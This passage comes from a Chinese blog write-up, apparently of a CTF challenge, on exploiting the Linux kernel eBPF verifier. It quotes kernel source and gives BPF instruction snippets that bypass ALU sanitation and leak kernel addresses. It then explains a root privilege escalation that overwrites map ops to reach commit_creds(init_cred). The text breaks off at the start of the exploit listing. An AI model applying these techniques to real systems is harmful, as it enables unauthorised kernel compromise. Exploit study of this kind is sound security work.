class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line"><span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line"><span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line"><span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line"><span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line"><span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们在开始定义类型为<code>BPF_MAP_TYPE_ARRAY</code>那么结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到在上面的<code>bpf_map</code>结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">array_map_ops</span> =</span> &#123;</span><br><span class="line">.map_meta_equal = array_map_meta_equal,</span><br><span class="line">.map_alloc_check = array_map_alloc_check,</span><br><span class="line">.map_alloc = array_map_alloc,</span><br><span class="line">.map_free = array_map_free,</span><br><span class="line">.map_get_next_key = array_map_get_next_key,</span><br><span class="line">.map_lookup_elem = array_map_lookup_elem,</span><br><span class="line">.map_update_elem = array_map_update_elem,</span><br><span class="line">.map_delete_elem = array_map_delete_elem,</span><br><span class="line">.map_gen_lookup = array_map_gen_lookup,</span><br><span class="line">.map_direct_value_addr = array_map_direct_value_addr,</span><br><span class="line">.map_direct_value_meta = array_map_direct_value_meta,</span><br><span class="line">.map_mmap = array_map_mmap,</span><br><span class="line">.map_seq_show_elem = array_map_seq_show_elem,</span><br><span class="line">.map_check_btf = array_map_check_btf,</span><br><span class="line">.map_lookup_batch = generic_map_lookup_batch,</span><br><span class="line">.map_update_batch = generic_map_update_batch,</span><br><span class="line">.map_btf_name = <span class="string">&quot;bpf_array&quot;</span>,</span><br><span class="line">.map_btf_id = &amp;array_map_btf_id,</span><br><span class="line">.iter_seq_info = &amp;iter_seq_info,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为我们上面所选择的类型为数组，所以这里ops会包含<code>array_map_ops</code>指针，所以我们可以利用它来泄漏内核地址。</p><p>如果我们使用<code>BPF_FUNC_map_lookup_elem</code>来进行函数调用的话，根据上述ops我们最终会调用到<code>array_map_lookup_elem</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from syscall or from eBPF program */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">array_map_lookup_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>-&gt;value + <span class="built_in">array</span>-&gt;elem_size * (index &amp; <span class="built_in">array</span>-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是<code>map_ptr.value</code>所以可以根据这里的偏移得出返回内容为<code>map_ptr+0x110</code>的地址。</p><p>可能到这里大家都应该有一定的思路了，不过这里还存在一个检测<code>ALU Sanitation</code>，在这个检测中<code>alu_limit</code>表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们<code>src_reg</code>的值大于<code>alu_limit</code>或者与之符号相反，那么<code>src_reg</code>会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_0, EXP_REG),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, OOB_REG, <span class="number">0x1000</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, <span class="number">0x1000</span> - <span class="number">1</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br></pre></td></tr></table></figure><p>因为这里存在一个verifier为0的寄存器<code>EXP_REG</code>那么我们如果进行上述代码中的操作即可是的<code>alm_limit</code>为<code>0x1000</code></p><p>那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure><p>只需要将<code>oob_map</code>的<code>array_map_ops</code>放到<code>store_map</code>的value中去即可。并且在<code>bpf_map</code>中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取<code>oob_map</code>的地址了。</p><p>不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，<code>obj_get_info_by_fd</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">u32 info_len = attr-&gt;info.info_len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uinfo, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">info_len = <span class="keyword">min_t</span>(u32, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">info.type = <span class="built_in">map</span>-&gt;map_type;</span><br><span class="line">info.id = <span class="built_in">map</span>-&gt;id;</span><br><span class="line">info.key_size = <span class="built_in">map</span>-&gt;key_size;</span><br><span class="line">info.value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line">info.max_entries = <span class="built_in">map</span>-&gt;max_entries;</span><br><span class="line">info.map_flags = <span class="built_in">map</span>-&gt;map_flags;</span><br><span class="line"><span class="built_in">memcpy</span>(info.name, <span class="built_in">map</span>-&gt;name, <span class="keyword">sizeof</span>(<span class="built_in">map</span>-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line">info.btf_vmlinux_value_type_id = <span class="built_in">map</span>-&gt;btf_vmlinux_value_type_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_info_fill(&amp;info, <span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u32 <span class="title">btf_obj_id</span><span class="params">(<span class="keyword">const</span> struct btf *btf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> btf-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我们控制<code>bpf_map</code>结构体中的btf即可实现真正意义上的任意地址泄漏。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>其实这里的提权方式可能大家都能想到，因为在<code>bpf_map</code>结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。</p><p>这里选择的最终利用函数是前面提到过的<code>work_for_cpu_fn</code>函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中<code>map_get_next_key</code>函数所在位置的指针替换为<code>work_for_cpu_fn</code>，紧接着写入到<code>oob_map</code>的value中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *next_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (!(map_get_sys_perms(<span class="built_in">map</span>, f) &amp; FMODE_CAN_READ)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ukey) &#123;</span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">next_key = kvmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line"><span class="keyword">if</span> (!next_key)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(unext_key, next_key, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_next_key:</span><br><span class="line">kvfree(next_key);</span><br><span class="line">free_key:</span><br><span class="line">kvfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择这个函数的很明显，在中途直接调用了ops中的<code>map_get_next_key</code>，并且第一个参数为map。那么这个时候我们如果修改ops为我们的<code>bpf-&gt;value</code>即可调用到<code>work_for_cpu_fn</code>，那么在根据<code>work_for_cpu_fn</code>函数内部调整<code>commit_creds</code>和<code>init_cred</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span 